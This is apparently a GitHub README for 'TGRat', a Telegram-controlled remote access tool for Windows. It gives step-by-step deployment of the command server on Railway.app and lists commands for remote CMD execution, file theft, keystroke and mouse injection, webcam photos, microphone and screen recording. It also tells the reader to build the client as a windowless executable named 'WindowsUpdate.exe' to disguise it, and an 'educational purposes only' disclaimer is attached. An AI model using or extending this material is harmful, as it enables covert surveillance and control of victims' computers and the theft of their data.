# TGRat - Remote Administration Tool via Telegram

![Python](https://img.shields.io/badge/Python-3.10%2B-blue)
![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?logo=windows)
![Telegram](https://img.shields.io/badge/Telegram-Bot_API-blue?logo=telegram)
![Status](https://img.shields.io/badge/Status-Production-green)
![License](https://img.shields.io/badge/License-MIT-yellow)

**A client-server system for remote Windows management via Telegram bot. The server runs 24/7 on Railway.app, while the client is distributed as a standalone EXE.**

## 🎯 Features

- ✅ **24/7 Server**: Runs on free Railway.app hosting
- ✅ **Auto Topics**: Each client creates a separate Telegram topic
- ✅ **Unlimited Clients**: Manage unlimited number of machines
- ✅ **Async Architecture**: High performance server
- ✅ **Session History**: Track online/offline status
- ✅ **Plugin System**: Extensible with custom plugins

## 📦 This Repository

Contains **server-side only** for deployment on Railway.app.

Client-side is distributed separately as compiled EXE.

## 🚀 Quick Deploy to Railway

### Step 1: Fork this Repository

Click the "Fork" button above to create your own copy.

### Step 2: Create Telegram Bot

1. Open [@BotFather](https://t.me/botfather)
2. Send `/newbot`
3. Follow instructions
4. Save your **BOT TOKEN**

### Step 3: Create Group with Topics

1. Create a new Telegram group
2. Settings → Enable **"Topics"** (required!)
3. Add bot to the group
4. Grant bot **Administrator** rights
5. Get **GROUP_CHAT_ID** (use [@userinfobot](https://t.me/userinfobot))

### Step 4: Deploy on Railway

[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app)

1. Login to [Railway.app](https://railway.app) with GitHub
2. Click **New Project** → **Deploy from GitHub repo**
3. Select your forked repository
4. Add **Environment Variables**:
   ```
   TOKEN = your_telegram_bot_token_here
   GROUP_CHAT_ID = -100xxxxxxxxxx
   ```
5. Go to **Settings** → **Networking**
6. Click **Add TCP Proxy** → Port: **7777**
7. Wait for deployment to complete

### Step 5: Get Server Hostname

After deployment, find in Railway dashboard:
```
Public Domain: your-app.railway.app
TCP Proxy: your-app.railway.app:7777
```

This address is needed for client configuration.

## 📋 Main Commands

### 📁 File Management:
```
/ls [path]              - List files and folders
/cd <path>              - Change directory
/download <file>        - Download file from client
/upload                 - Upload file to client
```

### ⚙️ System:
```
/sysinfo                - System information
/tasklist               - Process list
/screenshot             - Take screenshot
/execute <command>      - Run CMD command
```

### 🖱️ Input Control:
```
/keypress <keys>        - Press key combination
/mouseclick             - Click mouse
/mousemove <X> <Y>      - Move cursor
```

### 🎬 Media:
```
/photo [index]          - Take webcam photo
/mic <seconds>          - Record audio
/webcam <idx> <sec>     - Record video
/screenrecord <sec>     - Record screen
```

### 🔧 Management:
```
/clients                - List active clients
/clients_off            - List offline clients
/help                   - Full command list
```

**Full command reference:** [COMMANDS.md](COMMANDS.md)

## 🔐 Security

- ⚠️ **NEVER** commit `data_info.txt` with real tokens
- ✅ Use Environment Variables on Railway
- ✅ Keep `.gitignore` properly configured
- ✅ Regenerate bot token after first deployment
- ✅ Set repository to **Private** for sensitive projects

## 📊 Monitoring

Railway Dashboard provides:
- 📈 **Metrics**: CPU, RAM, Network usage
- 📝 **Real-time Logs**: See server activity
- 💵 **Cost Tracking**: ~$3/month usage
- 🔄 **Auto-restart**: On crashes

## 🛠️ Local Development

```bash
# Clone repository
git clone https://github.com/yourusername/tgrat-server.git
cd tgrat-server

# Install dependencies
pip install -r requirements.txt

# Create data_info.txt (for local testing only!)
echo "TOKEN = your_token_here" > data_info.txt
echo "GROUP_CHAT_ID = -100xxxxxxxxxx" >> data_info.txt

# Run server
python server.py
```

### Update on Railway

```bash
git add .
git commit -m "Update server"
git push
```

Railway will automatically redeploy after push.

## 🔧 Configuration

### Environment Variables (Railway):

| Variable | Description | Example |
|----------|-------------|---------|
| `TOKEN` | Telegram Bot Token | `123456:ABC-DEF...` |
| `GROUP_CHAT_ID` | Telegram Group ID | `-1001234567890` |

### Server Settings (server.py):

```python
HOST = '0.0.0.0'        # Listen on all interfaces
PORT = 7777             # TCP port (must match client)
```

## 📱 Client Setup

The client is built separately and distributed as EXE.

**Client configuration** (before building):
```python
DEFAULT_IP = "your-app.railway.app"  # Railway domain
DEFAULT_PORT = 7777                   # Must match server
```

**Build client:**
```bash
pyinstaller --onefile --noconsole --name WindowsUpdate client.py
```

**Result:** `dist/WindowsUpdate.exe`

## 🎮 How It Works

```
Railway Server (24/7)
        ↓
    Internet
        ↓
┌───────┴────────┬────────┬────────┐
│                │        │        │
Client1       Client2  Client3  Client4
Topic1        Topic2   Topic3   Topic4

→ Control ALL via Telegram!
```

Each client automatically creates its own topic:
```
🇺🇸 Win 10 | ⚡ PC-NAME | 192.168.1.100
```

## 🚧 Troubleshooting

### Server not starting

**Check:**
1. Environment variables are set correctly
2. Bot has admin rights in group
3. Topics are enabled in group
4. Railway logs for errors

### Client can't connect

**Check:**
1. Server is running (check Railway logs)
2. DEFAULT_IP matches Railway domain
3. PORT 7777 is exposed (TCP Proxy)
4. Firewall not blocking connection

## ⚠️ Important Disclaimer

**This project is created for EDUCATIONAL PURPOSES ONLY.**

- ❌ DO NOT use for unauthorized access
- ❌ DO NOT install on devices without permission
- ✅ Use ONLY on your own devices
- ✅ Learn about networking and security responsibly

The author is NOT responsible for misuse of this software.

## 📄 License

MIT License - see [LICENSE](LICENSE) file

## 🤝 Contributing

Pull requests are welcome!

1. Fork the project
2. Create feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Open Pull Request

## 💬 Support

- 📖 **Documentation**: Read [COMMANDS.md](COMMANDS.md)
- 🐛 **Issues**: Use GitHub Issues
- 💡 **Features**: Submit feature requests

## 🌟 Star This Repo

If you find this project useful, please give it a ⭐!

---

**Made with ❤️ for learning and security research**

*Remember: With great power comes great responsibility*
